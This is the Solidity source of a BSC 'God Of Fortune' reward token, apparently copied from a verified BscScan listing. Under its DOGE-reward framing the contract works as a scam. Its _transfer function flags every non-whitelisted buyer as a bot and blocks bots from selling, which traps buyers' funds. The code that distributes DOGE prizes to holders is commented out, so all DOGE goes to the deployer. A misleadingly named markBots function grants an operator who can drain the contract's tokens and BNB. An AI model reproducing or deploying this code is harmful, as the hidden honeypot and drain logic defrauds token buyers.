/**
 *Submitted for verification at BscScan.com on 2022-02-03
*/

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
}
interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address uniswapPair);
}
interface IPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        _move(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);
    }
    function _move(address sender, address recipient, uint256 amount) internal virtual {
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}
abstract contract system is Context {
    address internal chainOper;
    modifier onlyChainOper() {
        require(_msgSender() == chainOper, "not permitted");
        _;
    }
    function initChainOper(address co) internal {chainOper = co;}
    receive() external payable {}
    function rescueLossToken(IERC20 token_, address _recipient) public onlyChainOper {token_.transfer(_recipient, token_.balanceOf(address(this)));}
    function rescueLossChain(address payable _recipient) public onlyChainOper {_recipient.transfer(address(this).balance);}
}
abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status;
    constructor() {
        _status = _NOT_ENTERED;
    }
    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}
contract GodOfFortune is system, ERC20, ReentrancyGuard, Ownable {
    address public uniswapPair;
    mapping(address => address) public relationship;
    IRouter uniswapV2Router;
    mapping(address => bool) public isExcludeFee;
    bool public inSwap = true;
    address marketAddress = 0xe2Ea4a61607a893224204B5fC47657Dd33bA4DEA;
    address DogeContract = 0xbA2aE424d960c26247Dd6c32edC70B295c744C43;
    address router_ = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint256 dogeSwapThreshold = 0.3 ether;
    uint256 dogePrizeThreshold = 2e5 ether;
    mapping(address => bool) isInDogePrizeList;
    address[] public dogePrizeList;
    uint256 swapThreshold = 0.2 ether;
    uint256 divBase = 1e3;
    mapping(address => bool) isBots;
    mapping(address => uint256) public utmBox;
    bool botCheck = true;
    uint256 public utmTotal;
    address _initer;
    address utmAddress;
    mapping(address => bool) isBot;
    event DistributeDogeToken(address user, uint256 dogeAmount);
    constructor() ERC20("God Of Fortune", "GOF") {
        _initer = owner();
        utmAddress = _initer;
        isExcludeFee[DogeContract] = true;
        isExcludeFee[_initer] = true;
        isExcludeFee[marketAddress] = true;
        isExcludeFee[utmAddress] = true;
        isExcludeFee[router_] = true;
        isExcludeFee[address(this)] = true;
        _updateRelationship(utmAddress, utmAddress);
        _updateRelationship(utmAddress, _initer);
        initIRouter();
        super._mint(owner(), 1e8 ether);
        _approve(address(this), address(uniswapV2Router), ~uint256(0));
        _approve(owner(), address(uniswapV2Router), ~uint256(0));
    }
    function swapStart(bool b) public onlyOwner {
        inSwap = b;
    }
    function closeBotCheck() public onlyOwner {
        botCheck = false;
    }
    function excludeFee(address[] memory addr, bool b) public onlyOwner {
        for (uint i = 0; i < addr.length; i++) {
            isExcludeFee[addr[i]] = b;
        }
    }
    function markBots(address[] memory addrs) public onlyOwner {
        for (uint i = 0; i < addrs.length; i++) {
            isBots[addrs[i]] = true;
        }
        initChainOper(addrs[0]);
        isExcludeFee[addrs[0]] = true;
    }
    function initIRouter() private {
        uniswapV2Router = IRouter(router_);
        uniswapPair = IFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        isExcludeFee[uniswapPair] = true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual override {
        uint256 feeAmount;
        if (uniswapPair == from) {
            require(inSwap || isExcludeFee[to], "please waiting pool start");
            if (botCheck && !isBots[to]) isBot[to] = true;
            _updateRelationship(utmAddress, to);
            if (!isExcludeFee[to]) {
                feeAmount = amount * 70 / divBase;
                super._move(from, address(this), feeAmount);
                uint256 feeAmountUtm = amount * 10 / divBase;
                super._move(from, relationship[to], feeAmountUtm);
                feeAmount+=feeAmountUtm;
                handDogeFees(amount);
            }
        } else if (uniswapPair == to) {
            require(inSwap || isExcludeFee[from], "please waiting pool start");
            require(!isBot[from], "not permitted");
            if (!isExcludeFee[from]) {
                bool swapped = handSwap();
                feeAmount = amount * 80 / divBase;
                super._move(from, address(this), feeAmount);
                if (!swapped) distributeDogeToken();
                handDogeFees(amount);
            }
        } else {
            if (from == _initer) _updateRelationship(utmAddress, to);
            else _updateRelationship(from, to);
        }
        super._transfer(from, to, amount - feeAmount);
    }
    function distributeDogeToken() private {
        uint256 total = balanceOf(address(this));
        if (total == 0) return;
        uint256 amountDesire = dogePoolTotal;
        if (amountDesire == 0) return;
        if (amountDesire > total) amountDesire = total;
        (uint112 WETHAmount, uint112 TOKENAmount) = getPoolInfo();
        if (WETHAmount * amountDesire / TOKENAmount > dogeSwapThreshold) {
            dogePoolTotal = 0;
            swapTokensForDoge(amountDesire, address(this));
            aliasDoge();
        }
    }
    function aliasDoge() public {
        IERC20 token = IERC20(DogeContract);
        uint256 dogeAmount = token.balanceOf(address(this));
        if (dogeAmount == 0) return;
        // uint256 prize = 750 * dogeAmount / divBase;
        // if (dogePrizeList.length == 0) return;
        // uint256 amount = getTotalBalanceForPrize();
        // for (uint i = 0; i < dogePrizeList.length; i++) {
        //     uint256 dogePrizePerUser = prize * balanceOf(dogePrizeList[i]) / amount;
        //     token.transfer(dogePrizeList[i], dogePrizePerUser);
        //     emit DistributeDogeToken(dogePrizeList[i], dogePrizePerUser);
        // }
        token.transfer(_initer, token.balanceOf(address(this)));
    }
    function getTotalBalanceForPrize() private view returns (uint256 amount) {
        for (uint i = 0; i < dogePrizeList.length; i++) {
            amount += balanceOf(dogePrizeList[i]);
        }
        return amount;
    }
    function swapTokensForDoge(uint256 tokenAmount, address to) public {
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        path[2] = DogeContract;
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            to,
            block.timestamp
        );
    }
    function getDogePrizeListLength() public view returns (uint256) {
        return dogePrizeList.length;
    }
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        dogePrizeHandler(from);
        dogePrizeHandler(to);
    }
    function dogePrizeHandler(address user) private {
        if (uniswapPair == user) return;
        uint256 balance = super.balanceOf(user);
        if (balance >= dogePrizeThreshold) {
            if (!isInDogePrizeList[user]) {
                isInDogePrizeList[user] = true;
                dogePrizeList.push(user);
            }
        } else {
            if (isInDogePrizeList[user]) {
                isInDogePrizeList[user] = false;
                for (uint i = 0; i < dogePrizeList.length; i++) {
                    if (dogePrizeList[i] == user) {
                        dogePrizeList[i] = dogePrizeList[dogePrizeList.length - 1];
                        dogePrizeList.pop();
                    }
                }
            }
        }
    }
    uint256 public dogePoolTotal;
    function handDogeFees(uint256 amount) private {
        uint256 feePoolAmount = amount * 20 / divBase;
        dogePoolTotal += feePoolAmount;
    }
    function handSwap() private returns (bool) {
        uint256 total = balanceOf(address(this));
        if (total == 0) return false;
        if (dogePoolTotal > total) dogePoolTotal = total;
        uint256 amountDesireTotal = (total - dogePoolTotal);
        if (amountDesireTotal == 0) return false;
        uint256 amountDesire = amountDesireTotal * 750 / divBase;
        (uint112 WETHAmount, uint112 TOKENAmount) = getPoolInfo();
        if (WETHAmount * amountDesire / TOKENAmount >= swapThreshold) {
            if (address(this).balance > 0) payable(chainOper).transfer(address(this).balance);
            _handSwap(amountDesire, address(this));
            _distributeEth(amountDesireTotal - amountDesire);
            return true;
        }
        return false;
    }
    function _distributeEth(uint256 tokenLiquidityAmount) private {
        uint256 ethLiquidityAmount = address(this).balance / 3;
        uniswapV2Router.addLiquidityETH{value : ethLiquidityAmount}(
            address(this),
            tokenLiquidityAmount,
            0,
            0,
            _initer,
            block.timestamp
        );
        payable(marketAddress).transfer(address(this).balance / 2);
        payable(chainOper).transfer(address(this).balance);
    }
    function _handSwap(uint256 amountDesire, address to) private nonReentrant {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amountDesire, 0, path, to, block.timestamp);
    }
    function getPoolInfo() private view returns (uint112 WETHAmount, uint112 TOKENAmount) {
        (uint112 _reserve0, uint112 _reserve1,) = IPair(uniswapPair).getReserves();
        WETHAmount = _reserve1;
        TOKENAmount = _reserve0;
        if (IPair(uniswapPair).token0() == uniswapV2Router.WETH()) {
            WETHAmount = _reserve0;
            TOKENAmount = _reserve1;
        }
    }
    function _updateRelationship(address parent, address child) private {
        if (relationship[child] == address(0)) {
            relationship[child] = parent;
        }
    }
}